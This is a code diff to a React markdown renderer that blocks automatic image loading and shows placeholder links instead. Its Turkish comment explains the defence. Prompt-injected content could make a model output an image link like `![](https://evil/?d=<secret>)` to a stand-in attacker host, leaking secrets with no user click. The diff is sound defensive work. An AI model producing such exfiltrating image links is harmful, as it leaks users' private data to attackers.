@@ -32,6 +32,30 @@ export function MarkdownView({ text }: { text: string }) {
               </a>
             );
           },
+          // Görseller otomatik YÜKLENMEZ: bağlam güvenilmeyen not/kod içeriğinden
+          // geliyor; prompt injection `![](https://evil/?d=<sır>)` ile kullanıcı
+          // hiçbir şeye tıklamadan veri sızdırabilirdi. Yerine yer tutucu metin;
+          // http(s) ise kullanıcı isterse tıklayıp sistem tarayıcısında açar.
+          img: ({ src, alt }) => {
+            const url = typeof src === "string" ? src : "";
+            const label = `[${alt || "image"}]`;
+            if (!/^https?:\/\//i.test(url)) {
+              return <span title={url || undefined}>{label}</span>;
+            }
+            return (
+              <a
+                href={url}
+                title={url}
+                rel="noreferrer"
+                onClick={(e) => {
+                  e.preventDefault();
+                  void openUrl(url);
+                }}
+              >
+                {label}
+              </a>
+            );
+          },
         }}
       >
         {text}
